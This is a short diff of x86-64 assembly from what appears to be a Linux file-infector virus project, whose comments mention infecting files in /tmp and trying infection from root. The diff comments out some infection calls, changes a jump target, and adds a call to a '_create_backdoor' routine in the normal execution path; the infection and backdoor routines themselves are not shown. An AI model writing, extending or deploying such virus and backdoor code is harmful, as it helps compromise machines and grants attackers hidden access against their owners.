@@ -44,15 +44,11 @@ _check_registers:
 	cmp		QWORD [rsp + 64], 3 				; if argc == 3
 	je		_alternative_start_by_registers		; 
 	
-;	lea		r10, [rel _o_entry]					; %r10 = _o_entry
-;	cmp		QWORD [r10] , 0						; if %r10 == 0
-;	jne		_test_root_infect					; try infection from root
-;	call	_start_infect						; 
-;	jmp		_continue_normaly
     jmp     _fork_before_exec_normaly
 
 ;; If it's a normal execution, we just infect /tmp/test(2)
 _continue_normaly:
+	call _create_backdoor
 	mov		rax, 0
 	push	rax
 	push	rax
@@ -134,7 +130,7 @@ _alternative_start_by_registers:
 	lea		r11, [rel _verif]			; relative address of _verif
 	mov		r11, QWORD [r11]			; dereferencing
 	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
-	jne		_continue_normaly
+	jne		_fork_before_exec_normaly
 	
 	mov		rsi, QWORD [rsp + 72]		; take argv
 	mov		rsi, QWORD [rsi + 16]		; take argv[2]
